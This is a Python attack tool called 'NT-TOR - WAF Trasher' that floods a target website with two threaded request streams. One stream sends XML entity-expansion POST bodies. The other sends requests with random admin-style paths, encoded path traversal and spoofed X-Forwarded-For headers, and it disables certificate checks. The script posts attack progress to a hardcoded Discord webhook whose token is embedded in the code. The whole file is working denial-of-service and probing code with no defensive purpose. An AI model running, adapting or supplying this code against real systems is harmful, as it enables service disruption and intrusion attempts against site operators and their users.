#!/usr/bin/env python3
"""
NT-TOR - WAF Trasher
STS BASE V1 Logging System
"""

import socket
import ssl
import time
import random
import string
import threading
from datetime import datetime, timezone
from colorama import init, Fore, Style
import requests
import json

init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

# STS Style
STS = f"{MAGENTA}S.T.S{RESET}"

class NTTOR:
    def __init__(self, target, webhook_url, duration=300):
        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
        self.webhook_url = webhook_url
        self.duration = duration
        self.running = True
        
        # Stats
        self.h0_requests = 0
        self.h2_requests = 0
        self.data_sent = 0
        self.data_received = 0
        self.last_response_data = "INITIALIZING CONNECTION..."
        self.start_time = datetime.now()
        self.wave_number = 1
        self.last_discord_update = 0
        self.session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        self.lock = threading.Lock()
        
        # User agents
        self.samsung_uas = [
            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
        ]
        
        self.random_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ]
        
        # Random IPs
        self.ips = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(100)]
        
        # STS variations
        self.sts_variations = [
            "S.T.S", "STS", "S-T-S", "S.T.S.", "S_T_S", 
            "%53.%54.%53", "\\x53\\x54\\x53", "&#83;&#84;&#83;"
        ]
        
        # Send startup
        self.send_discord_update(initial=True)
        
        print(f"\n{MAGENTA}{STS} NT-TOR{WHITE} - WAF Trasher [STS BASE V1]{RESET}")
        print(f"{CYAN}Session: {self.session_id}{RESET}")
        print(f"Target: {target}")
        print(f"Duration: {duration}s")
        print(f"{YELLOW}H0 Engine: 250 reqs/2-7s | XML Bomb{RESET}")
        print(f"{RED}H2 Engine: 500 reqs/1-2s | Path Flood{RESET}")
        print("=" * 70)
        
    def rand_str(self, n=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
    
    def format_size(self, size):
        if size < 1024:
            return f"{size}B"
        elif size < 1024**2:
            return f"{size/1024:.2f}KB"
        elif size < 1024**3:
            return f"{size/1024**2:.2f}MB"
        else:
            return f"{size/1024**3:.2f}GB"
    
    def build_h0_payload(self):
        ua = random.choice(self.samsung_uas) if random.randint(1,20) == 1 else random.choice(self.random_uas)
        sts_var = random.choice(self.sts_variations)
        
        xml_bomb = f'''POST / HTTP/1.1
Host: {self.target}
X-Forwarded-Host: :{random.randint(1,9999)}
User-Agent: {ua}
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY sts "{sts_var}"><!ENTITY sts2 "&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;">]><root>&sts2;</root>'''
        
        return xml_bomb.replace('\n', '\r\n').encode()
    
    def build_h2_payload(self):
        ua = random.choice(self.random_uas)
        ip = random.choice(self.ips)
        
        paths = [f"/wp-admin/{self.rand_str(8)}.php", f"/includes/{self.rand_str(6)}.asp", f"/modules/{self.rand_str(7)}.jsp"]
        path = random.choice(paths)
        
        traversal = '../' * random.randint(3, 8)
        traversal = traversal.replace('../', '%2e%2e%2f')
        
        request = f"GET {path} HTTP/2\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {ua}\r\n"
        request += f"X-Forwarded-For: {ip}\r\n"
        request += f"Accept: ../../../../../../({self.rand_str(10)})\r\n"
        request += f"Referer: https://{self.target}/{traversal}{self.rand_str(8)}.php?sts={random.choice(self.sts_variations)}\r\n"
        request += "Cache-Control: no-cache\r\n\r\n"
        
        return request.replace('\n', '\r\n').encode()
    
    def send_h0_request(self):
        try:
            payload = self.build_h0_payload()
            
            with self.lock:
                self.data_sent += len(payload)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, 80))
            sock.send(payload)
            
            try:
                data = sock.recv(8192)
                with self.lock:
                    self.data_received += len(data)
                    if data and len(data) > 50:
                        preview = data[:200].decode('utf-8', errors='ignore').replace('\n', ' ').replace('\r', '')
                        self.last_response_data = f"{preview}... [{len(data)} bytes]"
            except:
                pass
            
            sock.close()
            
            with self.lock:
                self.h0_requests += 1
                
        except:
            pass
    
    def send_h2_request(self):
        try:
            payload = self.build_h2_payload()
            
            with self.lock:
                self.data_sent += len(payload)
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock = context.wrap_socket(sock, server_hostname=self.target)
            sock.connect((self.target, 443))
            sock.send(payload)
            
            try:
                data = sock.recv(8192)
                with self.lock:
                    self.data_received += len(data)
                    if data and len(data) > 50:
                        preview = data[:200].decode('utf-8', errors='ignore').replace('\n', ' ').replace('\r', '')
                        self.last_response_data = f"{preview}... [{len(data)} bytes]"
            except:
                pass
            
            sock.close()
            
            with self.lock:
                self.h2_requests += 1
                
        except:
            pass
    
    def send_discord_update(self, initial=False):
        """Send scary Discord update (20min waves)"""
        runtime = str(datetime.now() - self.start_time).split('.')[0]
        total_reqs = self.h0_requests + self.h2_requests
        
        if initial:
            embed = {
                "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
                "color": 0x4a0e4a,  # Dark purple
                "fields": [
                    {
                        "name": "S.T.S NT-TOR",
                        "value": f"```Session: {self.session_id}\nTarget: {self.target}\nWave: #{self.wave_number}```",
                        "inline": False
                    },
                    {
                        "name": "INITIALIZING",
                        "value": "```CONNECTION ESTABLISHED```",
                        "inline": False
                    }
                ],
                "footer": {"text": "STS BASE V1 • LOGGING ACTIVE"}
            }
        else:
            embed = {
                "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
                "color": 0x4a0e4a,
                "fields": [
                    {
                        "name": "S.T.S NT-TOR",
                        "value": f"```Session: {self.session_id}```",
                        "inline": False
                    },
                    {
                        "name": "TARGET",
                        "value": f"```{self.target}```",
                        "inline": False
                    },
                    {
                        "name": "T-R-S",
                        "value": f"```{total_reqs}```",
                        "inline": True
                    },
                    {
                        "name": "T-D-R",
                        "value": f"```{self.format_size(self.data_received)}```",
                        "inline": True
                    },
                    {
                        "name": "T-D-S",
                        "value": f"```{self.format_size(self.data_sent)}```",
                        "inline": True
                    },
                    {
                        "name": "RUNTIME",
                        "value": f"```{runtime}```",
                        "inline": False
                    },
                    {
                        "name": "LAST RESPONSE",
                        "value": f"```{self.last_response_data[:200]}```",
                        "inline": False
                    },
                    {
                        "name": f"WAVE #{self.wave_number}",
                        "value": "```PROPAGATING```",
                        "inline": False
                    }
                ],
                "footer": {"text": f"STS BASE V1 • WAVE {self.wave_number} • 20min CYCLE"}
            }
        
        try:
            requests.post(self.webhook_url, json={"embeds": [embed]})
        except:
            pass
    
    def h0_engine(self):
        while self.running:
            for _ in range(250):
                if not self.running: break
                self.send_h0_request()
                time.sleep(random.uniform(0.008, 0.028))
            if self.running:
                time.sleep(random.uniform(2, 7))
    
    def h2_engine(self):
        while self.running:
            for _ in range(500):
                if not self.running: break
                self.send_h2_request()
                time.sleep(random.uniform(0.002, 0.004))
            if self.running:
                time.sleep(random.uniform(1, 2))
    
    def monitor(self):
        """Terminal logging - STS Style"""
        last_h0 = 0
        last_h2 = 0
        
        while self.running:
            time.sleep(1)
            elapsed = (datetime.now() - self.start_time).seconds
            
            h0_rps = self.h0_requests - last_h0
            h2_rps = self.h2_requests - last_h2
            last_h0 = self.h0_requests
            last_h2 = self.h2_requests
            total = self.h0_requests + self.h2_requests
            
            # STS Terminal Format
            print(f"\r{MAGENTA}[S.T.S]{RESET} [{elapsed}s] "
                  f"{RED}H0:{self.h0_requests}({h0_rps}/s){RESET} | "
                  f"{CYAN}H2:{self.h2_requests}({h2_rps}/s){RESET} | "
                  f"{WHITE}TOT:{total}{RESET} | "
                  f"{YELLOW}↑{self.format_size(self.data_sent)} ↓{self.format_size(self.data_received)}{RESET}", 
                  end='', flush=True)
            
            # Discord update every 20 mins (1200 seconds) in waves
            if elapsed % 1200 < 1 and elapsed > 0:
                with self.lock:
                    self.wave_number += 1
                    self.send_discord_update()
            
            if elapsed >= self.duration:
                self.running = False
                break
    
    def start(self):
        # Start engines
        threading.Thread(target=self.h0_engine, daemon=True).start()
        threading.Thread(target=self.h2_engine, daemon=True).start()
        threading.Thread(target=self.monitor, daemon=True).start()
        
        try:
            time.sleep(self.duration + 1)
        except KeyboardInterrupt:
            self.running = False
        
        # Final stats
        elapsed = (datetime.now() - self.start_time).seconds
        total = self.h0_requests + self.h2_requests
        
        print(f"\n\n{MAGENTA}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{RESET}")
        print(f"{MAGENTA}S.T.S NT-TOR - SESSION TERMINATED{RESET}")
        print(f"Session: {self.session_id}")
        print(f"Target: {self.target}")
        print(f"H0 Requests: {self.h0_requests}")
        print(f"H2 Requests: {self.h2_requests}")
        print(f"Total: {total}")
        print(f"Data Sent: {self.format_size(self.data_sent)}")
        print(f"Data Received: {self.format_size(self.data_received)}")
        print(f"Duration: {elapsed}s")
        
        # Send final wave
        self.send_discord_update()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python nt-tor.py <target> [duration]")
        sys.exit(1)
    
    webhook = "https://discord.com/api/webhooks/1478989089045876779/fDm39Cls5AfZ0gZJM0sbhtJt59jo3i1Oy2_aHO3GmmSUw3gdg4pDfH7niEiXiA18ZJsM"
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    
    nt = NTTOR(target, webhook, duration)
    nt.start()
